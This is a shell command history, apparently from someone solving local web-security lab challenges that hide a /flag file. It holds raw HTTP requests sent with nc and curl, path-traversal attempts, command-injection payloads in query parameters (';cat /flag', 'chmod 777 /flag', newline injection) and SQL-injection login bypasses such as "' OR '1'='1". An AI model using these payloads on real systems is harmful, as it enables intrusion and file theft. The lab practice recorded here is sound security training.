+ 1196  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 57\r\nConnection: close\r\n\r\n{\"a\":\"76ffd814d9a09d2c0c20bcbca70b8e00\", \"b\":\"{'c': '1132c731', 'd': ['3a836ecf', '6de4bf46 e7af746d&7f470465#7696ca89']}\"}" | nc 127.0.0.1 80
+ 1197  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 57\r\nConnection: close\r\n\r\n{\"a\":\"76ffd814d9a09d2c0c20bcbca70b8e00\", \"key2\":\"value2\"}" | nc 127.0.0.1 80
+ 1198  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 123\r\nConnection: close\r\n\r\n{\"a\":\"76ffd814d9a09d2c0c20bcbca70b8e00\", \"b\":\"{'c': '1132c731', 'd': ['3a836ecf', '6de4bf46 e7af746d&7f470465#7696ca89']}\"}" | nc 127.0.0.1 80
+ 1199  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 123\r\nConnection: close\r\n\r\n{\"a\":\"76ffd814d9a09d2c0c20bcbca70b8e00\", \"b\":\"{'c': '1132c731', 'd': ['3a836ecf', '6de4bf46\ e7af746d\&7f470465#7696ca89']}\"}" | nc 127.0.0.1 80
+ 1200  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 123\r\nConnection: close\r\n\r\n{\"a\":\"76ffd814d9a09d2c0c20bcbca70b8e00\", \"b\":\"{'c': '1132c731', 'd': ['3a836ecf', '6de4bf46%20e7af746d%267f470465#7696ca89']}\"}" | nc 127.0.0.1 80
+ 1201  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 125\r\nConnection: close\r\n\r\n{\"a\":\"76ffd814d9a09d2c0c20bcbca70b8e00\", \"b\":\"{'c': '1132c731', 'd': ['3a836ecf', '6de4bf46\ e7af746d\&7f470465#7696ca89']}\"}" | nc 127.0.0.1 80
+ 1202  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 127\r\nConnection: close\r\n\r\n{\"a\":\"76ffd814d9a09d2c0c20bcbca70b8e00\", \"b\":\"{'c': '1132c731', 'd': ['3a836ecf', '6de4bf46%20e7af746d%267f470465#7696ca89']}\"}" | nc 127.0.0.1 80
+ 1203  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 127\r\nConnection: close\r\n\r\n{\"a\":\"76ffd814d9a09d2c0c20bcbca70b8e00\", \"b\":\"{'c': '1132c731', 'd': ['3a836ecf', '6de4bf46 e7af746d&7f470465#7696ca89']}\"}" | nc 127.0.0.1 80
+ 1204  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 14\r\nConnection: close\r\n\r\n{\"a\":\"76ffd814d9a09d2c0c20bcbca70b8e00\", \"b\":\"{'c': '1132c731', 'd': ['3a836ecf', '6de4bf46 e7af746d&7f470465#7696ca89']}\"}" | nc 127.0.0.1 80
+ 1205  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 124\r\nConnection: close\r\n\r\n{\"a\":\"76ffd814d9a09d2c0c20bcbca70b8e00\", \"b\":\"{'c': '1132c731', 'd': ['3a836ecf', '6de4bf46 e7af746d&7f470465#7696ca89']}\"}" | nc 127.0.0.1 80
+ 1206  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 124\r\nConnection: close\r\n\r\n{\"a\":\"76ffd814d9a09d2c0c20bcbca70b8e00\", \"b\":{'c': '1132c731', 'd': ['3a836ecf', '6de4bf46 e7af746d&7f470465#7696ca89']}" | nc 127.0.0.1 80
+ 1207  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 120\r\nConnection: close\r\n\r\n{\"a\":\"76ffd814d9a09d2c0c20bcbca70b8e00\", \"b\":{'c': '1132c731', 'd': ['3a836ecf', '6de4bf46 e7af746d&7f470465#7696ca89']}" | nc 127.0.0.1 80
+ 1208  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 122\r\nConnection: close\r\n\r\n{\"a\":\"76ffd814d9a09d2c0c20bcbca70b8e00\", \"b\":{'c': '1132c731', 'd': ['3a836ecf', '6de4bf46 e7af746d&7f470465#7696ca89']}" | nc 127.0.0.1 80
+ 1209  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 121\r\nConnection: close\r\n\r\n{\"a\":\"76ffd814d9a09d2c0c20bcbca70b8e00\", \"b\":{'c': '1132c731', 'd': ['3a836ecf', '6de4bf46 e7af746d&7f470465#7696ca89']}" | nc 127.0.0.1 80
+ 1210  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 121\r\nConnection: close\r\n\r\n{\"a\":\"76ffd814d9a09d2c0c20bcbca70b8e00\", \"b\":{'c': '1132c731', 'd': ['3a836ecf', '6de4bf46 e7af746d&7f470465#7696ca89']}"
+ 1211  echo -e "POST / HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 121\r\nConnection: close\r\n\r\n{\"a\":\"76ffd814d9a09d2c0c20bcbca70b8e00\", \"b\":{'c': '1132c731', 'd': ['3a836ecf', '6de4bf46 e7af746d&7f470465#7696ca89']}"
+ 1212  echo -e "POST / HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 121\r\nConnection: close\r\n\r\n{\"a\":\"76ffd814d9a09d2c0c20bcbca70b8e00\", \"b\":{'c': '1132c731', 'd': ['3a836ecf', '6de4bf46 e7af746d&7f470465#7696ca89']}" | nc 127.0.0.1 80
+ 1213  echo -e "POST / HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 122\r\nConnection: close\r\n\r\n{\"a\":\"76ffd814d9a09d2c0c20bcbca70b8e00\", \"b\":{'c': '1132c731', 'd': ['3a836ecf', '6de4bf46 e7af746d&7f470465#7696ca89']}" | nc 127.0.0.1 80
+ 1214  echo -e "POST / HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 120\r\nConnection: close\r\n\r\n{\"a\":\"76ffd814d9a09d2c0c20bcbca70b8e00\", \"b\":{'c': '1132c731', 'd': ['3a836ecf', '6de4bf46 e7af746d&7f470465#7696ca89']}" | nc 127.0.0.1 80
+ 1215  history > ttt.out
+ 1216  curl -H "Content-Type: application/json" -d '{"a":"a1a250aee832d2a326b3c1e2561b99b1", "b":{"c": "64d4a626", "d": ["9a35362a", "8b77a569 26852b65&69200f16#7c000827"]}}' http://127.0.0.1
+ 1217  echo -e "POST / HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 199\r\nConnection: close\r\n\r\n{\"a\":\"a1a250aee832d2a326b3c1e2561b99b1\", \"b\":{\"c\": \"64d4a626\", \"d\": [\"9a35362a\", \"8b77a569 26852b65&69200f16#7c000827\"]}}" | nc 127.0.0.1 80
+ 1218  echo -e "POST / HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 198\r\nConnection: close\r\n\r\n{\"a\":\"a1a250aee832d2a326b3c1e2561b99b1\", \"b\":{\"c\": \"64d4a626\", \"d\": [\"9a35362a\", \"8b77a569 26852b65&69200f16#7c000827\"]}}" | nc 127.0.0.1 80
+ 1219  echo -e "POST / HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 121\r\nConnection: close\r\n\r\n{\"a\":\"a1a250aee832d2a326b3c1e2561b99b1\", \"b\":{\"c\": \"64d4a626\", \"d\": [\"9a35362a\", \"8b77a569 26852b65&69200f16#7c000827\"]}}" | nc 127.0.0.1 80
+ 1220  echo -e "POST / HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 121\r\nConnection: close\r\n\r\n{\"a\":\"76ffd814d9a09d2c0c20bcbca70b8e00\", \"b\":{\"c\": \"64d4a626\", \"d\": [\"9a35362a\", \"8b77a569 26852b65&69200f16#7c000827\"]}}" | nc 127.0.0.1 80
+ 1221  echo -e "POST / HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 121\r\nConnection: close\r\n\r\n{\"a\":\"76ffd814d9a09d2c0c20bcbca70b8e00\", \"b\":{\"c\": \"1132c731\", \"d\": [\"3a836ecf\", \"6de4bf46 e7af746d&7f470465#7696ca89\"]}}" | nc 127.0.0.1 80
+ 1222  curl -H "Content-Type: application/json" -d '{"a":"a1a250aee832d2a326b3c1e2561b99b1", "b":{"c": "64d4a626", "d": ["9a35362a", "8b77a569 26852b65&69200f16#7c000827"]}}' http://127.0.0.1
+ 1223  curl -H "Content-Type: application/json" -d '{"a":"a1a250aee832d2a326b3c1e2561b99b1", "b":{"c": "64d4a626", "d": ["9a35362a", "8b77a569 26852b65&69200f16#7c000827"]}}' http://127.0.0.1/a2f72eb6e8dff56bd4356d0a1de69fa8
+ 1224  echo -e "POST / HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 121\r\nConnection: close\r\n\r\n{\"a\":\"76ffd814d9a09d2c0c20bcbca70b8e00\", \"b\":{\"c\": \"1132c731\", \"d\": [\"3a836ecf\", \"6de4bf46 e7af746d&7f470465#7696ca89\"]}}" | nc 127.0.0.1 80
+ 1225  echo -e "POST /45529327e930079b055be14da190859b HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 121\r\nConnection: close\r\n\r\n{\"a\":\"76ffd814d9a09d2c0c20bcbca70b8e00\", \"b\":{\"c\": \"1132c731\", \"d\": [\"3a836ecf\", \"6de4bf46 e7af746d&7f470465#7696ca89\"]}}" | nc 127.0.0.1 80
+ 1226  curl -H "Content-Type: application/json" -d '{"a":"a1a250aee832d2a326b3c1e2561b99b1", "b":{"c": "64d4a626", "d": ["9a35362a", "8b77a569 26852b65&69200f16#7c000827"]}}' http://127.0.0.1
+ 1227  curl -b cookies.txt -c cookies.txt http://127.0.0.1/
+ 1228  curl -b cookies.txt -c cookies.txt http://127.0.0.1
+ 1229  echo -e "GET / HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n" | nc 127.0.0.1 80
+ 1230  echo -e "GET /some-other-page HTTP/1.1\r\nHost: 127.0.0.1\r\nCookie: cookie=1382875f22dd52396c0633ac0468fd4a\r\nConnection: close\r\n\r\n" | nc 127.0.0.1 80
+ 1231  curl -b cookies.txt -c cookies.txt http://127.0.0.1
+ 1232  curl http://127.0.0.1
+ 1233  curl -b cookies.txt -c cookies.txt http://127.0.0.1
+ 1234  echo -e "GET /some-other-page HTTP/1.1\r\nHost: 127.0.0.1\r\nCookie: cookie=1382875f22dd52396c0633ac0468fd4a\r\nConnection: close\r\n\r\n" | nc 127.0.0.1 80
+ 1235  echo -e "GET /some-other-page HTTP/1.1\r\nHost: 127.0.0.1\r\nCookie: session=eyJzdGF0ZSI6MX0.ZzCs1Q.TT3S35KV5UFfB0PgYC9IfRGRiYs\r\nConnection: close\r\n\r\n" | nc 127.0.0.1 80
+ 1236  echo -e "GET /some-other-page HTTP/1.1\r\nHost: 127.0.0.1\r\nCookie: session=eyJzdGF0ZSI6Mn0.ZzCs7A.hT80QPtRvAm-A6frPaXkKuDUkvg\r\nConnection: close\r\n\r\n" | nc 127.0.0.1 80
+ 1237  echo -e "GET /some-other-page HTTP/1.1\r\nHost: 127.0.0.1\r\nCookie: session=eyJzdGF0ZSI6M30.ZzCtAw.rWH4wMRCKWw_1DLcf3ezz_U7Ilk\r\nConnection: close\r\n\r\n" | nc 127.0.0.1 80
+ 1238  curl 127.0.0.1
+ 1239  curl 127.0.0.1/
+ 1240  curl -v 127.0.0.1/
+ 1241  curl -v 127.0.0.1/flag
+ 1242  curl -v http://127.0.0.1/flag
+ 1243  curl -v http://127.0.0.1/index.html
+ 1244  /challenge/server 
+ 1245  ls
+ 1246  ls /challenge/
+ 1247  cat /challenge/DESCRIPTION.md 
+ 1248  curl -v http://127.0.0.1/files
+ 1249  /challenge/server 
+ 1250  ls /challenge/files/
+ 1251  cat /challenge/files/index.html 
+ 1252  ls /flag 
+ 1253  curl -v http://127.0.0.1/challenge/files/index..html
+ 1254  curl -v http://127.0.0.1/challenge/files/index.html
+ 1255  curl -v http://127.0.0.1/challenge/files/
+ 1256  curl -v http://127.0.0.1/index.html
+ 1257  curl -v http://127.0.0.1/../../../../
+ 1258  curl -v http://127.0.0.1/../../../../flag
+ 1259  curl -v http://127.0.0.1/challenge
+ 1260  curl -v http://127.0.0.1/index.html
+ 1261  curl -v http://127.0.0.1/A
+ 1262  /challenge/server 
+ 1263  cd /challenge/
+ 1264  curl -v http://127.0.0.1/index.html
+ 1265  curl -v http://127.0.0.1index.html
+ 1266  echo -e "GET index.html HTTP/1.1\r\nHost: 127.0.0.1\r\nCookie: session=eyJzdGF0ZSI6Mn0.ZzCs7A.hT80QPtRvAm-A6frPaXkKuDUkvg\r\nConnection: close\r\n\r\n" | nc 127.0.0.1 80
+ 1267  curl -v http://127.0.0.1index.html
+ 1268  curl -v http://127.0.0.1\index.html
+ 1269  curl -v http://127.0.0.1/index.html
+ 1270  curl -v challenge.localhost
+ 1271  curl -v challenge.localhost/index.html
+ 1272  curl -v challenge.localhost/../../flag
+ 1273  curl -v challenge.localhost/../../../flag
+ 1274  /challenge/server 
+ 1275  cd /
+ 1276  curl -v challenge.localhost/../../../index
+ 1277  curl -v challenge.localhost/../../../index.html
+ 1278  /challenge/server 
+ 1279  curl -v challenge.localhost/../../../flag
+ 1280  curl -v challenge.localhost:80/../../../flag
+ 1281  curl -v challenge.localhost:80/../../../A
+ 1282  ls -al /challenge/
+ 1283  curl -v challenge.localhost:80../../../A
+ 1284  curl -v challenge.localhost:80../../../
+ 1285  curl -v challenge.localhost/../../../
+ 1286  curl -v challenge.localhost/index.html
+ 1287  curl -v challenge.localhost/index
+ 1288  curl -v challenge.localhost/../../../
+ 1289  curl -v challenge.localhost//../../../
+ 1290  curl -v localhost/
+ 1291  ipython
+ 1292  curl http://challenge.localhost:80/
+ 1293  curl http://challenge.localhost:80/../../
+ 1294  curl http://challenge.localhost:80/../../flag
+ 1295  curl http://challenge.localhost:80/../..//flag
+ 1296  curl http://challenge.localhost:80/./flag
+ 1297  curl http://challenge.localhost:80/DES
+ 1298  ipython
+ 1299  echo -e "GET index.html HTTP/1.1\r\nHost: 127.0.0.1\r\nCookie: session=eyJzdGF0ZSI6Mn0.ZzCs7A.hT80QPtRvAm-A6frPaXkKuDUkvg\r\nConnection: close\r\n\r\n" | nc challenge.localhost 80
+ 1300  echo -e "GET /index.html HTTP/1.1\r\nHost: 127.0.0.1\r\nCookie: session=eyJzdGF0ZSI6Mn0.ZzCs7A.hT80QPtRvAm-A6frPaXkKuDUkvg\r\nConnection: close\r\n\r\n" | nc challenge.localhost 80
+ 1301  echo -e "GET /index.html HTTP/1.1\r\nHost: 127.0.0.1\r\nCookie: session=eyJzdGF0ZSI6Mn0.ZzCs7A.hT80QPtRvAm-A6frPaXkKuDUkvg\r\nConnection: close\r\n\r\n" | nc challenge.localhost
+ 1302  echo -e "GET /index.html HTTP/1.1\r\nHost: 127.0.0.1\r\nCookie: session=eyJzdGF0ZSI6Mn0.ZzCs7A.hT80QPtRvAm-A6frPaXkKuDUkvg\r\nConnection: close\r\n\r\n" | nc challenge.localhost 80
+ 1303  curl http://challenge.localhost:80/
+ 1304  echo -e "GET /index.html HTTP/1.1\r\nHost: 127.0.0.1\r\nCookie: session=eyJzdGF0ZSI6Mn0.ZzCs7A.hT80QPtRvAm-A6frPaXkKuDUkvg\r\nConnection: close\r\n\r\n" | nc challenge.localhost 80
+ 1305  /challenge/server ./
+ 1306  cd challenge/
+ 1307  ls
+ 1308  ls -al
+ 1309  ls -al ./files/
+ 1310  ls
+ 1311  curl http://challenge.localhost:80/
+ 1312  curl http://challenge.localhost:80/files
+ 1313  curl http://challenge.localhost:80/file
+ 1314  curl http://challenge.localhost:80/files/../../../../
+ 1315  curl http://challenge.localhost:80/flag
+ 1316  curl http://challenge.localhost:80/flags
+ 1317  /challenge/server
+ 1318  strace ./server 
+ 1319  ipython
+ 1320  curl http://challenge.localhost/../../../../flags
+ 1321  curl http://challenge.localhost/../../../../flags -v
+ 1322  curl http://challenge.localhost/../../../../../../../../../../../../../../../../flags -v
+ 1323  /challenge/server
+ 1324  ls -al ./
+ 1325  cd ..
+ 1326  ls -al ./
+ 1327  ls -al ./challenge/files/
+ 1328  cd challenge/
+ 1329  ls
+ 1330  ./server 
+ 1331  curl http://challenge.localhost/../../../../../../../../../../../../../../../../flags -v
+ 1332  echo -e "GET /index.html HTTP/1.1\r\nHost: 127.0.0.1\r\nCookie: session=eyJzdGF0ZSI6Mn0.ZzCs7A.hT80QPtRvAm-A6frPaXkKuDUkvg\r\nConnection: close\r\n\r\n" | nc challenge.localhost 80
+ 1333  ipython
+ 1334  curl http://challenge.localhost/%2e%2e/%2e%2e/flags -v
+ 1335  curl http://challenge.localhost/files/../../..//flags -v
+ 1336  curl http://challenge.localhost///../../../flags -v
+ 1337  nc http://challenge.localhost 80
+ 1338  nc challenge.localhost 80
+ 1339  curl http://challenge.localhost///../../../flags -v
+ 1340  ls /challenge/
+ 1341  vim /challenge/.config 
+ 1342  ls ./files
+ 1343  ls /challenge/files/
+ 1344  ls /challenge/files/fortunes/
+ 1345  curl http://challenge.localhost///../../../flags -v
+ 1346  nc 127.0.0.1 80
+ 1347  curl http://challenge.localhost/?directory=/challenge -v
+ 1348  curl http://challenge.localhost/?directory=/challenge;cat /flag -v
+ 1349  curl http://challenge.localhost/?directory=/challenge\;cat /flag -v
+ 1350  curl http://challenge.localhost/?directory=/challenge\;cat\ /flag -v
+ 1351  curl http://challenge.localhost/?directory=/challenge\;cat%20/flag -v
+ 1352  curl http://challenge.localhost/?directory=/challenge\|cat%20/flag -v
+ 1353  curl http://challenge.localhost/?directory='/challenge'\;cat%20/flag -v
+ 1354  curl http://challenge.localhost/?directory=\'/challenge\;cat%20/flag\' -v
+ 1355  TZ=MST data
+ 1356  TZ=MST date
+ 1357  curl http://challenge.localhost/?timezone=MST\;cat%20/flag -v
+ 1358  curl http://challenge.localhost/?filepath=MST\;cat%20/flag -v
+ 1359  ls /challenge/
+ 1360  ls /MST
+ 1361  ls /challenge/
+ 1362  ls /challenge/ -al
+ 1363  curl http://challenge.localhost/?filepath=ttt\;cat%20/flag -v
+ 1364  curl http://challenge.localhost/?filepath=ttt\;chmod%20777%20/flag -v
+ 1365  cat /flag 
+ 1366  ls ? cat
+ 1367  ls ./ ? cat
+ 1368  ls ./ ? cat ./A
+ 1369  rm MST
+ 1370  ls ./ ; cat ./A
+ 1371  ls ./ . cat ./A
+ 1372  ls ./ , cat ./A
+ 1373  ls ./ > cat ./A
+ 1374  ls ./  cat ./A >
+ 1375  ls ./ \n  cat ./A
+ 1376  ls ./ & cat ./A
+ 1377  ls ./ \t cat ./A
+ 1378  man ascii
+ 1379  curl http://challenge.localhost/?filepath=ttt\%10chmod%20777%20/flag -v
+ 1380  cat /flag 
+ 1381  curl http://challenge.localhost/?filepath=ttt\%10cat%20/flag -v
+ 1382  man acsii
+ 1383  man ascii
+ 1384  curl http://challenge.localhost/?filepath=ttt\%0acat%20/flag -v
+ 1385  curl http://challenge.localhost/?filepath=ttt\%20cat%20/flag -v
+ 1386  curl http://challenge.localhost/?directory=ttt\%20cat%20/flag -v
+ 1387  curl http://challenge.localhost/?directory=ttt\%0acat%20/flag -v
+ 1388  ls
+ 1389  /challenge/server 
+ 1390  ipython
+ 1391  curl -F "username=admin" -F "password=111 or 1 = 1" http://challenge.localhost
+ 1392  curl -F "username=admin" -F "password=111 or 1 = 1" http://challenge.localhost/
+ 1393  curl  http://challenge.localhost/
+ 1394  curl  http://challenge.localhost/?session_user=admin
+ 1395  curl -F "username=admin" -F "password=111 or 1 = 1" http://challenge.localhost/
+ 1396  curl  http://challenge.localhost/?session_user=admin
+ 1397  curl -F "username=admin" -F "password=111 OR 1 = 1" http://challenge.localhost/
+ 1398  curl -F "username=admin" -F "password=111%20OR%201=1" http://challenge.localhost/
+ 1399  curl -F "username=guest" -F "password=passwword" http://challenge.localhost/
+ 1400  curl -F "username=guest" -F "password=password" http://challenge.localhost/
+ 1401  curl -F "username=guest" -F "password=password" http://challenge.localhost/ -b cookies.txt -c cookies.txt
+ 1402  curl http://challenge.localhost/?session_user=admin -b cookies.txt -c cookies.txt
+ 1403  curl http://challenge.localhost/?session_user=admin
+ 1404  vim cookies.txt 
+ 1405  curl http://challenge.localhost/?session_user=admin -b cookies.txt -c cookies.txt
+ 1406  curl -F "username=guest" -F "pin=1337" http://challenge.localhost/ -b cookies.txt -c cookies.txt
+ 1407  vim cookies.txt 
+ 1408  curl http://challenge.localhost/?user=admin -b cookies.txt -c cookies.txt
+ 1409  vim cookies.txt 
+ 1410  curl -F "username=guest" -F "pin=1337" http://challenge.localhost/ -b cookies.txt -c cookies.txt
+ 1411  vim cookies.txt 
+ 1412  rm cookies.txt 
+ 1413  curl -F "username=guest" -F "pin=1337" http://challenge.localhost/ -b cookies.txt -c cookies.txt
+ 1414  vim cookies.txt 
+ 1415  curl -F "username=admin" -F "pin=111 or 1 = 1" http://challenge.localhost/ -b cookies.txt -c cookies.txt
+ 1416  curl http://challenge.localhost/?user=admin -b cookies.txt -c cookies.txt
+ 1417  curl -F "username=admin" -F "password=111\' or 1 = 1\'" http://challenge.localhost/ -b cookies.txt -c cookies.txt
+ 1418  curl -F "username=admin" -F "password=111' or 1 = 1'" http://challenge.localhost/ -b cookies.txt -c cookies.txt
+ 1419  curl -F "username=admin" -F "password=111%27 or 1 = 1%27" http://challenge.localhost/ -b cookies.txt -c cookies.txt
+ 1420  curl -F "username=admin" -F "password=111\' OR 1 = 1\'" http://challenge.localhost/ -b cookies.txt -c cookies.txt
+ 1421  curl -F "username=admin" -F "password=111\' OR 1=1\'" http://challenge.localhost/ -b cookies.txt -c cookies.txt
+ 1422  curl -F "username=admin" -F "password=111' OR 1 = 1'" http://challenge.localhost/ -b cookies.txt -c cookies.txt
+ 1423  curl -F "username=admin" -F "password=111' OR '1'='1" http://challenge.localhost/ -b cookies.txt -c cookies.txt
+ 1424  curl http://challenge.localhost/?user=admin -b cookies.txt -c cookies.txt
 echo -e "POST / HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 121\r\nConnection: close\r\n\r\n{\"a\":\"76ffd814d9a09d2c0c20bcbca70b8e00\", \"b\":{\"c\": \"1132c731\", \"d\": [\"3a836ecf\", \"6de4bf46 e7af746d&7f470465#7696ca89\"]}}" | nc 127.0.0.1 80
-
-
 
 curl -b cookies.txt -c cookies.txt http://127.0.0.1
 echo -e "GET /some-other-page HTTP/1.1\r\nHost: 127.0.0.1\r\nCookie: cookie=1382875f22dd52396c0633ac0468fd4a\r\nConnection: close\r\n\r\n" | nc 127.0.0.1 80
